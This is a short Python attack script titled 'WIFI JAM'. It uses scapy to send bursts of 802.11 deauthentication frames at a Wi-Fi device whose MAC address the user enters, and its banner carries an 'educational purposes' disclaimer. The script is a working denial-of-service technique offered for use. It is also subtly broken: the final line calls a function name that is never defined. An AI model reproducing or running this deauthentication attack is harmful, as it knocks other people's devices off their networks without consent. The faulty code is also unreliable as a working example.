
from scapy.all import *
import os

print ("\033[92m")
os.system("clear")
os.system("figlet -w 1200 ==== NS HACK ==== ")

print ("\033[92m ")
print ("")
print ("_________________________________________________________________________________")
print ("|--------------------------- author :  NS HACK ----------------------------------| ")
print ("|-------------------------- TOOL NAME : WIFI JAM --------------------------------| ")
print ("|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES -------------------| ")
print ("— ————————————————————————————————————————————————————————————————————————————————")
print (" ") 

print ("\033[92m")

print (" _______________________________________________________  ")
print ("|                 REQUIRED WIFI ADAPTER                 |     ")
print ("|_______________________________________________________| ")
print ("")
print ("\033[91m")
target_mac = input( " ENTER TAGET MAC ADDRESS : ")
interface = "wlan0"


def jam_wifi(mac):
    packet = RadioTap() / Dot11(addr1=mac, type=0, subtype=12) / Dot11Deauth()
    sendp(packet, iface="wlan0", count=100, inter=0.1)  # Adjust count and inter as needed

jam_wifi_network(target_mac, interface)

